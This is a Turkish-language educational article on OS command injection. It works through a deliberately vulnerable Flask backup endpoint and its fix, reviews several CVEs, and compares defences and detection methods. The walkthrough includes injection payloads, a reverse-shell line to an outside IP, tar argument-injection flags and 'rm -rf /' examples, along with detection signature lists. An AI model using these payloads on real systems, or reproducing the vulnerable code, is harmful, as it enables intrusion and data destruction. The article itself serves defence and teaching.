# OS Command Injection — Derin Dalış

Bu metin, `bilgi_hazinesi/uretilen/guvenlik/command-injection.md` altındaki özet makalenin devamı ve derinleştirilmesidir. Özet, zafiyetin tanımını, kök nedenini ("veri ile kod aynı düzlemde birleşir ve bir kabuk devreye girer") ve savunma katmanlarını kavramsal düzeyde veriyordu. Burada aynı zemine oturarak işi uygulamalı hâle getiriyoruz: gerçek çalışan kod üzerinden bir zafiyeti baştan sona çözüyor, gerçek CVE kayıtlarına bakıyor, savunma seçeneklerini takaslarıyla karşılaştırıyor ve sahada tekrar tekrar görülen hataları katalogluyoruz. Amaç savunma ve tespittir; canlı bir saldırı reçetesi değil, mekanizmanın nasıl işlediğini anlamaktır.

---

## 1. Çözümlü yürüyüş

Somut bir senaryo alalım: bir web panelinde yöneticinin sunucu içi yedeklerin bir kopyasını "harici bir konuma" göndermesini sağlayan bir özellik var. Kullanıcı bir hedef dizin adı ve bir arşiv adı giriyor; uygulama arka planda `tar` ile arşivliyor ve `scp` ile gönderiyor. Bu, gerçek dünyada sıkça karşılaşılan bir kalıptır — "bir CLI aracını web'den sarmalamak".

### 1.1 Zafiyetli kod

Python + Flask ile yazılmış gerçekçi ve hatalı bir hâli:

```python
import os
from flask import Flask, request

app = Flask(__name__)

BACKUP_DIR = "/var/app/backups"

@app.route("/backup", methods=["POST"])
def backup():
    archive_name = request.form["archive_name"]   # örn. "gunluk-yedek"
    remote_dir   = request.form["remote_dir"]      # örn. "yedekler/2026"

    # Arşivi oluştur
    os.system(f"tar -czf /tmp/{archive_name}.tar.gz {BACKUP_DIR}")

    # Uzak sunucuya gönder
    os.system(f"scp /tmp/{archive_name}.tar.gz backup@10.0.0.5:{remote_dir}/")

    return "Yedekleme tamamlandı", 200
```

Bu kod, normal girdilerde tam olarak beklendiği gibi çalışır. `archive_name = "gunluk-yedek"`, `remote_dir = "yedekler/2026"` verildiğinde şu iki komut oluşur:

```
tar -czf /tmp/gunluk-yedek.tar.gz /var/app/backups
scp /tmp/gunluk-yedek.tar.gz backup@10.0.0.5:yedekler/2026/
```

Fonksiyonel testler geçer, demo çalışır, kod merge edilir. Sorun görünürde yoktur — ta ki girdiye "veri" değil "komut" gelene kadar.

### 1.2 Sorun kavramsal olarak nasıl ortaya çıkıyor

`os.system()`, kendisine verilen dizeyi doğrudan bir kabuğa (`/bin/sh -c "..."`) teslim eder. Kabuk bu dizeyi saf metin olarak görmez; **tokenize eder**: boşluklarda kelimelere böler, `;` `|` `&&` `$(...)` backtick gibi meta-karakterleri kontrol sembolü sayar, glob ve değişken genişletmesi uygular. Uygulama "tek bir `tar` komutu çalıştırıyorum" sanır; kabuk ise dizede ne yazıyorsa onu okur.

Saldırgan `archive_name` alanına şunu yazsın:

```
yedek; id
```

Oluşan dize:

```
tar -czf /tmp/yedek; id.tar.gz /var/app/backups
```

Kabuk bunu `;` üzerinden iki ayrı komuta böler: önce `tar -czf /tmp/yedek` (bozuk ama çalışır), sonra `id.tar.gz /var/app/backups` (`id.tar.gz` diye bir komut yoktur, hata verir). İlk denemede saldırgan komut ayırıcının işlediğini görür. Sonra daha temiz bir yük dener:

```
yedek$(id > /tmp/pwned)
```

Bu sefer komut ikamesi (`$(...)`) devreye girer: kabuk önce iç komutu (`id > /tmp/pwned`) çalıştırır, çıktısını dizeye gömer, sonra dış `tar`'ı çalıştırır. `id` çıktısı artık `/tmp/pwned` dosyasındadır. Uygulama hiçbir çıktı göstermese bile — bu **kör (blind)** durumdur — yan etki gerçekleşmiştir.

Asıl kritik nokta şudur: burada iki ayrı enjeksiyon noktası var (`archive_name` ve `remote_dir`) ve `remote_dir` daha da tehlikelidir, çünkü `scp` satırında değeri filtreleyen hiçbir şey yoktur. `remote_dir` alanına

```
x; bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
```

yazıldığında, `scp` komutu bozulur ama arkasından gelen komut hedef makinenin saldırgan makinesine bir ters kabuk açmasını sağlar. Uygulama `www-data` yerine `root` ile çalışıyorsa (ki bu tür "sistem işi yapan" servislerde sık görülür) sonuç doğrudan root RCE'dir.

Sorunun özü, özet makaledeki cümleyle birebir örtüşür: **veri (`archive_name`, `remote_dir`) ile kod (`tar`, `scp` komut satırı) aynı düzlemde birleştirildi ve bu birleşimi yorumlayan bir kabuk sahneye çıktı.**

### 1.3 Düzeltilmiş kod

Doğru çözüm iki katmanlıdır: (a) kabuğu tamamen devreden çıkarmak — argümanları liste olarak vermek, (b) girdiyi allow-list ile daraltmak. Ayrıca dolaylı bir tuzağı — **argüman enjeksiyonunu** — kapatmak.

```python
import re
import subprocess
from flask import Flask, request

app = Flask(__name__)

BACKUP_DIR = "/var/app/backups"

# İzin verilen arşiv adı: yalnızca harf, rakam, tire, alt çizgi; başı-sonu sabit
ARCHIVE_RE = re.compile(r"\A[A-Za-z0-9_-]{1,64}\Z")
# İzin verilen uzak dizin: harf/rakam/tire/alt çizgi ve tek seviye eğik çizgi
REMOTE_RE  = re.compile(r"\A[A-Za-z0-9_/-]{1,128}\Z")

def reject_if_flaglike(value: str) -> None:
    # '-' ile başlayan değer bir programa bayrak (flag) gibi görünebilir
    if value.startswith("-"):
        raise ValueError("gecersiz girdi")

@app.route("/backup", methods=["POST"])
def backup():
    archive_name = request.form["archive_name"]
    remote_dir   = request.form["remote_dir"]

    # 1) Allow-list dogrulamasi (basi-sonu sabitlenmis pozitif regex)
    if not ARCHIVE_RE.match(archive_name):
        return "gecersiz arsiv adi", 400
    if not REMOTE_RE.match(remote_dir):
        return "gecersiz dizin", 400

    reject_if_flaglike(archive_name)
    reject_if_flaglike(remote_dir)

    archive_path = f"/tmp/{archive_name}.tar.gz"

    # 2) Kabuk YOK: argumanlar liste; '--' ile bayrak/konumsal ayrimi
    subprocess.run(
        ["tar", "-czf", archive_path, "--", BACKUP_DIR],
        check=True,
    )
    subprocess.run(
        ["scp", "--", archive_path, f"backup@10.0.0.5:{remote_dir}/"],
        check=True,
    )

    return "Yedekleme tamamlandi", 200
```

Neden bu kod güvenli:

- `subprocess.run([...])` çağrısında `shell=True` yoktur. Liste biçiminde çağrıldığında Python, `execve` benzeri bir yolla programı doğrudan çalıştırır; araya `/bin/sh` girmez. Dolayısıyla `;`, `$(...)`, backtick, `|` gibi karakterlerin **hiçbir özel anlamı kalmaz**. `archive_name` içinde `$(id)` geçse bile, bu değer `tar`'a tek bir argüman olarak gider ve `tar` "böyle bir dosya yok" der.
- Allow-list, kabuk yorumlaması olmasa bile mantıksal kötüye kullanımı ve argüman enjeksiyonunu daraltır. `ARCHIVE_RE` ve `REMOTE_RE` başı-sonu sabitlenmiştir (`\A ... \Z`); bu, `8.8.8.8; rm -rf /` gibi "içinde geçerli parça var" tipi kaçakları engeller.
- `reject_if_flaglike`, girdinin `-` ile başlamasını yasaklar; `--` ayırıcısı ise programa "bundan sonrası bayrak değil, konumsal argüman" der. Bu ikisi birlikte, kullanıcının `--checkpoint-action=exec=...` gibi bir `tar` bayrağı enjekte etmesini engeller (buna 4. bölümde döneceğiz).

Not: `scp`'nin hedef kısmı (`backup@10.0.0.5:{remote_dir}/`) `scp`'nin kendi protokolüne göre yorumlanır; en sağlam çözüm burada bile `scp` yerine bir SFTP kütüphanesi (`paramiko`) kullanarak dış programı tamamen kaldırmaktır. "En iyi savunma, filtreye ihtiyaç bırakmayan mimaridir" ilkesinin devamı budur.

### 1.4 Windows/`cmd.exe` bağlam farkı

Aynı zafiyetin Windows tarafındaki hâli, POSIX kabuğu için yazılmış "temizleme" mantığını sessizce delebilir. `cmd.exe`'de komut ayırıcı `;` değil `&`, `&&` ve `|`'dir; ayrıca `%VAR%` ortam değişkeni genişletmesi ve `^` kaçış karakteri kendine özgü kurallara sahiptir. Şöyle bir kod düşünün:

```python
# Windows'ta ZAFİYETLİ — cmd.exe'ye ham dize geçiyor
import subprocess
name = request.form["name"]
subprocess.run(f"nslookup {name}", shell=True)   # shell=True -> cmd.exe
```

`name` alanına `example.com & whoami` geldiğinde `cmd.exe` bunu iki komut olarak koşar. POSIX düşünülerek yazılmış "`;` karakterini engelledim" tarzı bir deny-list burada tamamen işe yaramaz, çünkü Windows ayırıcısı zaten `&`'dir. Çözüm yine aynıdır: `shell=False` (varsayılan) ile `subprocess.run(["nslookup", name])`. Kabuğu kaldırdığınızda `cmd.exe` sözdiziminin tüm tuhaflıkları da sahneden çekilir — platforma özgü ayrıştırıcıyı modellemeye çalışma yükünden kurtulursunuz.

---

## 2. Gerçek dünya (CVE ile)

Verilen gerçek CVE kayıtları, yukarıdaki soyut mekanizmanın sahada nasıl somutlaştığını gösteriyor. Üç tanesine yakından bakalım.

### CVE-2005-10004 — Cacti `graph_view.php`, `graph_start` parametresi

Bu kayıt, 1.3 bölümündeki düzeltilmiş kodun neyi önlediğini birebir gösteren bir vaka. Cacti (bir ağ grafikleme aracı), 0.8.6-d öncesi sürümlerde `graph_view.php` betiğinde uzaktan komut çalıştırma açığı barındırıyordu. **Kimliği doğrulanmış** bir kullanıcı, `graph_start` GET parametresi üzerinden keyfî shell komutları enjekte edebiliyordu; parametre, grafik oluşturma sırasında işletim sistemine geçerken düzgün nötrlenmiyordu (CWE-78). Sonuç: komutlar web sunucusu sürecinin ayrıcalıklarıyla işletim sisteminde çalışıyordu. Kaydın CVSS v4.0 puanı 8.7 (HIGH) ve bir Metasploit modülü referansı içermesi, bu tür açıkların ne kadar rahat silahlaştırıldığını gösteriyor. Buradaki ders: bir grafik/rapor parametresi bile — görünürde "sadece bir sayı" — arka planda `rrdtool` gibi bir aracı bir kabuk üzerinden çağırıyorsa tam teşekküllü bir RCE kanalına dönüşür. Kimlik doğrulama gerektirmesi etkiyi hafifletmez; iç kullanıcı ya da çalınmış oturum yeterlidir.

### CVE-2005-10003 — Xcomic, `cmd` parametresi

mikexstudios Xcomic 0.8.2 ve öncesinde, `cmd` argümanının manipülasyonu OS command injection'a yol açıyordu (CWE-78). Kaydın ilginç yanı, "saldırının karmaşıklığının yüksek, sömürülebilirliğin zor" olarak tanımlanması (CVSS v3.1: 5.6 MEDIUM) — yani her enjeksiyon açığı "tek satır yaz, root ol" kadar kolay değildir; bazı durumlar zamanlama, bağlam ya da özel koşullar gerektirir. Yine de sorun 0.8.3'te bir yamayla (commit `6ed8e3c...`) kapatılmıştır. Buradan çıkan iki ders var: (1) Parametre adının açıkça `cmd` olması, tasarımın en baştan "kullanıcı bir komut söylüyor" varsayımıyla kurulduğunu düşündürür — bu, kaçınılması gereken bir anti-pattern'dir. (2) "Sömürüsü zor" damgası bir gerekçe değildir; açık kapatılana kadar risk canlıdır.

### CVE-2006-6427 ve CVE-2006-5290 — Xerox WorkCentre Web arayüzü

Bu iki kayıt birlikte, gömülü cihazlarda (embedded) command injection'ın tipik yüzünü gösterir. Xerox WorkCentre / WorkCentre Pro yazıcıların Web kullanıcı arayüzü, uzak saldırganların komut çalıştırmasına izin veriyordu. CVE-2006-6427'ye göre enjeksiyon vektörleri **TCP/IP hostname**, **Scan-to-mailbox klasör adları** ve **Microsoft Networking yapılandırma parametreleri** idi; kayıt ayrıca vektör (1)'in muhtemelen CVE-2006-5290 ile aynı olduğunu belirtiyor. CVE-2006-5290 ise aynı hostname alanı üzerinden kimlik doğrulamayı atlayıp kod çalıştırmaya odaklanıyor. Buradaki örüntü çok öğreticidir: bir "hostname" ya da "klasör adı" gibi alan, kullanıcı için sadece bir isimdir; ama cihazın firmware'i bu değeri arka planda bir ağ yapılandırma betiğine (`ifconfig`, `hostname`, Samba ayarları) bir kabuk üzerinden geçiriyorsa, isim alanı doğrudan bir shell'e açılan kapıya döner. Gömülü cihazlarda bu özellikle yıkıcıdır çünkü süreçler neredeyse her zaman en yüksek ayrıcalıkla (root) koşar ve güncelleme yavaştır. Aynı dosya adı/hostname mantığı, özet makaledeki "dosya adlarını ve yollarını veri sanmak" hatasının canlı kanıtıdır.

**Ortak çıkarım.** Bu dört CVE farklı on yıllardan ve farklı yığınlardan (PHP web app, küçük bir uygulama, kurumsal yazıcı firmware'i) geliyor ama hepsinin kalbi aynı: kullanıcı kontrollü bir değer, bir kabuk komutunun içine sınırsızca yerleştirildi. Teknoloji değişti, kök neden değişmedi.

---

## 3. Karşılaştırma / karar

Command injection'a karşı birden çok savunma yaklaşımı vardır ve bunlar birbirinin alternatifi değil, farklı takaslara sahip katmanlardır. Bir kıdemli mühendisin verdiği asıl karar "hangisini seçeyim" değil, "hangi katmanları hangi sırayla yığayım" sorusudur. Yine de her seçeneğin ne zaman öne çıktığını ayırmak gerekir.

### Seçenek A — Dış programı hiç çağırmamak (yerleşik kütüphane)

**Ne zaman:** İş, dilin/çatının kütüphanesiyle yapılabiliyorsa her zaman ilk tercih. DNS çözümleme, dosya kopyalama, arşivleme, görüntü dönüştürme, SFTP transfer — bunların hepsinin olgun kütüphaneleri vardır (Python'da `shutil`, `tarfile`, `socket`, `paramiko`; Node'da `fs`, `tar`; vb.).
**Takas:** Bazı işler (özel bir CLI aracının benzersiz davranışı, harici bir ikili) kütüphaneyle birebir taklit edilemez; kod biraz daha uzun olabilir. Karşılığında saldırı yüzeyi tümden kaybolur — çünkü ortada komut satırı yoktur.
**Karar kuralı:** "Bir alt süreç açmam gerçekten gerekiyor mu?" sorusuna dürüst yanıt "hayır" ise, tartışma burada biter.

### Seçenek B — Argüman dizisi (kabuksuz `exec`)

**Ne zaman:** Dış programı çağırmak zorunlu olduğunda **her seferinde** bu kullanılır. `subprocess.run([...])`, `execFile`/`spawn`, `ProcessBuilder(list)`, `exec.Command(...)`. Bu, kabuk yorumlama katmanını yok eden asıl teknik savunmadır.
**Takas:** Neredeyse hiç maliyeti yok; tek "kayıp", kabuğun boru hattı (`|`), yönlendirme (`>`), glob (`*`) gibi kolaylıklarını otomatik alamamak. Ama bu bir kayıp değil kazançtır: o kolaylıklar tam da saldırı vektörleridir. Boru gerekiyorsa iki süreci Python/Go tarafında `stdout`→`stdin` bağlayarak, kabuğa hiç girmeden kurabilirsiniz.
**Uyarı:** Argüman dizisi komut zincirlemeyi bitirir ama **argüman enjeksiyonunu tek başına bitirmez** (4. bölüm). Bu yüzden allow-list ile birlikte gelmelidir.

### Seçenek C — Allow-list ile girdi doğrulama

**Ne zaman:** Her durumda, B'nin üstüne. İki biçimi var: (1) **değer allow-list** — girdi sonlu bir kümedense (dil kodu, işlem türü), sabit bir eşlemeyle (`{"start": ..., "stop": ...}`) doğrula; kullanıcı ham komut değil, bir seçim verir. (2) **biçim allow-list** — girdi serbest metinse ama biçimi bilinebiliyorsa (IP, hostname, dosya adı), başı-sonu sabitlenmiş pozitif regex ile kısıtla.
**Takas:** Değer allow-list en güçlüsüdür ama yalnızca sonlu kümeler için işler. Biçim allow-list daha esnektir ama regex'i yanlış yazma (ankraj unutma, çok satır tuzağı) riski taşır. Deny-list (kara liste) ise **hiçbir zaman** doğru seçenek değildir — kabuk meta-karakterleri çok, platformlar arası farklı ve kodlama hileleriyle atlatılabilir; bir karakteri unutmak açığı geri açar.
**Karar kuralı:** "İzin verdiklerimi sayabiliyor muyum?" → evet ise allow-list; "yasaklayacaklarımı sayacağım" diye düşünüyorsan durup yeniden tasarla.

### Seçenek D — Kaçış/temizleme (escaping)

**Ne zaman:** Neredeyse hiçbir zaman **birincil** savunma olarak değil. `shlex.quote()` (Python) gibi araçlar, kabuk çağırmak *zorunda* olduğunuz istisnai durumlarda tek bir argümanı güvenli hâle getirmek için vardır. Ama bu, "kabuğu kaldıramıyorum" itirafıdır ve platforma bağlı, kırılgandır.
**Takas:** `shlex.quote` POSIX kabukları için tasarlanmıştır; `cmd.exe`/PowerShell'de kuralları farklıdır ve `shlex.quote` orada yanıltıcı bir güven verir. Elle yazılan kaçış mantığı ise pratikte her zaman bir açık bırakır.
**Karar kuralı:** Bu seçeneğe düşüyorsan, önce "B'ye (argüman dizisi) neden geçemiyorum?" sorusunu yanıtla. Genellikle cevap "geçebilirdim" olur.

### Seçenek E — Çevresel/mimari savunma (least privilege, sandbox, egress)

**Ne zaman:** Her zaman, ama **son katman** olarak. Bunlar açığı kapatmaz; açık sömürüldüğünde patlama yarıçapını daraltır. Süreci `root` yerine kısıtlı kullanıcıyla çalıştırmak, seccomp/AppArmor/SELinux ile sistem çağrılarını kısmak, egress firewall ile reverse shell ve OOB sızmayı zorlaştırmak.
**Takas:** Tek başlarına asla yeterli değildir — bir mühendis bunları "asıl savunma yaptım" diye rahatlamak için kullanmamalıdır. Ama A–D doğru yapıldığında bile, sıfır-gün bir zincir ya da unutulmuş bir kod yolu için ikinci bir emniyet kemeridir.

**Özetle karar hiyerarşisi:** A varsa A. Yoksa B + C birlikte, üstüne E. D yalnızca kaçınılmaz istisnada ve yine C+E ile beraber. Tek bir katmana yaslanmak — özellikle sadece D veya sadece deny-list — sahada en sık görülen ve en pahalıya patlayan karardır.

### Tespit (detection) tarafı: sömürüldüğünde nasıl görünür

Savunma önleme ile bitmez; enjeksiyon denemesini ya da başarısını tespit etmek de savunmanın parçasıdır. Pratikte en verimli sinyaller şunlardır:

- **Beklenmeyen çocuk süreçler (process tree anomalisi).** Bir web sunucusu sürecinin (`php-fpm`, `python`, `node`) altında aniden `sh`, `bash`, `whoami`, `id`, `curl`, `nslookup`, `cmd.exe` ya da `powershell.exe` doğması güçlü bir işarettir. EDR/Sysmon ile "web servisinin beklenen çocuk süreç kümesi" allow-list'lenip dışına çıkan her şey alarm üretebilir.
- **Egress DNS/HTTP anomalileri.** Kör enjeksiyonda saldırgan OOB kanal (`nslookup saldirgan.example`, veri gömülmüş alt alan adları) kullanır. Sunucudan bilinmeyen alan adlarına giden ani DNS sorguları ya da dışa keyfî bağlantılar, hem reverse shell'in hem OOB sızmanın izidir; egress firewall bunları hem engeller hem loglar.
- **Payload imzaları girdi loglarında.** `;`, `|`, `$(`, backtick, `%0a`, `${IFS}`, `&&` gibi dizilerin form alanlarında, başlıklarda ya da dosya adlarında görülmesi (özellikle hostname/IP beklenen alanlarda) bir prob denemesidir. Bu, WAF kuralları için de temel oluşturur — ancak WAF bir önleme değil, ek bir tespit/geciktirme katmanıdır; asıl düzeltme koddadır.
- **Zamanlama sapmaları.** `; sleep 10` tipi time-based problar, normalde milisaniyelik biten bir uç noktanın aniden saniyelerce sürmesiyle kendini belli eder; yanıt süresi metrikleri bu tür denemeleri açığa çıkarır.

---

## 4. Hata-modu kataloğu

Aşağıdaki hatalar, gerçek kod incelemelerinde ve olay müdahalelerinde tekrar tekrar karşılaşılan, zafiyeti açan ya da yeniden açan tipik yanlışlardır.

1. **`shell=True` / `os.system` / `exec` kolaylığına kanmak.** Tek bir dizeyi kabuğa vermek en hızlı yol gibi görünür; oysa bu, meta-karakter yorumlamasını ve tüm saldırı yüzeyini tek hamlede açar. Argüman dizisi neredeyse aynı satır sayısıyla yazılabilir.

2. **"Girdiyi temizledim, güvendeyim" yanılgısı.** Kabuğu çağırmayı sürdürürken kaçış/temizleme yapmak, karmaşık ve platforma bağlı bir sözdizimiyle yarışmaktır; elle yazılan mantık neredeyse her zaman bir kaçak bırakır. Doğru refleks temizlemeyi güçlendirmek değil, kabuğu kaldırmaktır.

3. **Deny-list'e güvenmek.** Sadece `;`, `|`, `&` engellenir; `$(...)`, backtick, `%0a` (newline), `${IFS}`, `>` gibi düzinelerce alternatif açık kalır. Güvenliyi listelemek gerekirken tehlikeliyi listelemeye çalışmak, saldırganın hayal gücüyle yarışmaktır.

4. **Regex'i ankrajsız yazmak.** `[A-Za-z0-9.-]+` gibi bir kalıp `\A...\Z` (ya da `^...$` yerine kesin çapa) ile sınırlanmazsa, `8.8.8.8; rm -rf /` girdisi "içinde geçerli bir parça var" diye kabul görebilir. Kalıbı her zaman dizenin başına ve sonuna sabitleyin.

5. **Çok satır (`$` vs `\z`) tuzağı.** Birçok regex motorunda `$`, dizenin sonunu değil satır sonunu eşler; `%0a`/`\n` içeren bir girdi ilk satırıyla doğrulamayı geçip ikinci satırında komut taşıyabilir. Dize sonu için `\Z`/`\z` kullanın veya newline'ı açıkça reddedin.

6. **Argüman enjeksiyonunu unutmak.** Kabuk çağrılmasa bile, `-` ile başlayan bir girdi bir programın bayrağı olarak yorumlanabilir. Klasik örnek: kullanıcı girdisi `tar`'a giderken `--checkpoint=1 --checkpoint-action=exec=sh` enjekte etmek ya da `find`'a `-exec` sokmak. Çözüm: `--` ayırıcısı ve "girdi `-` ile başlayamaz" kuralı.

7. **Yalnızca istemci tarafı (client-side) doğrulama.** Tarayıcıdaki JavaScript kontrolü sadece kullanılabilirlik içindir; saldırgan isteği doğrudan sunucuya (curl, Burp) gönderir. Tüm doğrulama sunucu tarafında yapılmalıdır.

8. **Dosya adlarını ve yollarını "veri" sanmak.** Yüklenen bir dosyanın adı `; rm -rf /` ya da `$(reboot)` içerebilir. Bu ad sonradan bir komuta girerse aynı açık doğar (Xerox WorkCentre'daki hostname/klasör-adı vektörleri tam olarak budur). Dosya adlarına da allow-list uygulayın, hatta sunucu tarafında yeniden üretin.

9. **İkinci-derece (second-order / stored) enjeksiyonu atlamak.** Girdi her zaman doğrudan form alanından gelmez. Veritabanına yazılmış eski bir kayıt, bir HTTP başlığı (User-Agent, X-Forwarded-For), bir çerez ya da bir cron'un okuduğu dosya sonradan komut oluştururken kullanılıyorsa birer enjeksiyon kaynağıdır. Doğrulama "girişte" yapıldı diye "kullanımda" güvenli sanmak yanlıştır.

10. **Argüman dizisi kullanıp içeride yeniden kabuk açmak.** Argüman dizisiyle çağırdığınız programın kendisi bir betikse ve içeride girdiyi `sh -c` ile çalıştırıyorsa, zafiyet katman değiştirmiş ama kapanmamıştır. Zincirin tamamını (wrapper betikleri, `Makefile` hedefleri, `git` hook'ları dahil) izlemek gerekir.

11. **Kör (blind) senaryoyu "risk yok" sanmak.** "Çıktıyı göstermiyorum, güvendeyim" düşüncesi yanlıştır. Komutun yan etkileri — dosya silme, ters kabuk açma, `; sleep 10` ile zaman sızıntısı, `nslookup` ile OOB kanal — çıktı gösterilmese de gerçekleşir. Tespit tarafında da bu yüzden zamanlama ve egress DNS/HTTP anomalileri izlenmelidir.

12. **Aşırı ayrıcalıkla çalıştırmak.** Servisi `root`/`SYSTEM` ile koşturmak, başarılı bir enjeksiyonu doğrudan tam sistem ele geçirmeye çevirir. Cacti (web sunucusu ayrıcalığı) ve Xerox (firmware root) örnekleri, ayrıcalık seviyesinin etkiyi nasıl belirlediğini gösterir. En az ayrıcalık, açığı kapatmaz ama patlama yarıçapını küçültür.

13. **Statik/dinamik tarama yapmamak.** Kabuk çağıran API'ler (`os.system`, `subprocess(..., shell=True)`, `child_process.exec`, `Runtime.exec(String)`) SAST araçlarıyla kolayca yakalanır; enjeksiyon noktaları DAST ve kod incelemesiyle taranabilir. Bu denetimi CI hattına koymamak, yukarıdaki hataların üretime sızmasına açık kapı bırakır.

---

Bütün bu bölümlerin ortak çıkarımı, özet makalenin kapanış cümlesiyle aynıdır ve derinleştirilmiş hâliyle şudur: **Command injection'a karşı en güçlü savunma akıllı bir filtre yazmak değil, filtreye ihtiyaç bırakmayan bir mimari kurmaktır.** Önce dış programı hiç çağırmamayı dene; çağırmak zorundaysan kabuğu asla araya sokma (argüman dizisi); girdiyi allow-list ile daralt; argüman enjeksiyonunu `--` ile kapat; ve en az ayrıcalık, sandbox, egress kısıtlaması ile patlama yarıçapını küçült. Gerçek CVE kayıtlarının onlarca yıl boyunca aynı kök nedeni tekrar etmesi, bu disiplinin ne kadar kalıcı olduğunu kanıtlıyor.
